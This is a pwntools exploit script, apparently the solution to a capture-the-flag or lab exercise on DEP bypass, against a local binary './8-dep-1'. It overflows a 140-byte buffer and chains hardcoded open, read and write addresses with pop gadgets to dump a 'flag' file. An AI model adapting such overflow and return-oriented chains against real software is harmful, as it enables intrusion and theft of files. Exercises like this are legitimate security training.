#!/usr/bin/env python3
import struct

from pwn import *
from pwn import asm, context, gdb, p8, p16, p32, process

context.terminal = ["tmux", "splitw", "-h"]
context.log_level = "DEBUG"

io = process(["./8-dep-1"])
# io = gdb.debug(["./8-dep-1"])
io.recv()
# 1. fd = open("flag", O_RDONLY);
# 2. read(fd, buf, 0x100);
# 3. write(1, buf, 0x100);
# some_function: 0x08048894
# __libc_read = 0x806d340
# __libc_write = 0x806d3b0
open_func = 0x08048894
read_func = 0x806D340
write_func = 0x0806D3B0
pop_ret = 0x08048480
pop2_ret = 0x080483C9
pop3_ret = 0x08062E0B
fd = 0x00000003
buf = 0xFFFFD381
exit = 0x8095BCC
payload = p8(0x00) * 140
# 1. fd = open("flag", O_RDONLY);
payload += p32(open_func)
# 2. read(fd, buf, 0x100);
payload += struct.pack("I", read_func)
payload += struct.pack("I", pop3_ret)
payload += struct.pack("I", fd)
payload += struct.pack("I", buf)
payload += struct.pack("I", 0x100)
# 3. write(1, buf, 0x100);
payload += struct.pack("I", write_func)
payload += struct.pack("I", pop3_ret)
payload += struct.pack("I", 1)
payload += struct.pack("I", buf)
payload += struct.pack("I", 0x100)
payload += struct.pack("I", exit)
io.sendline(payload)
io.interactive()
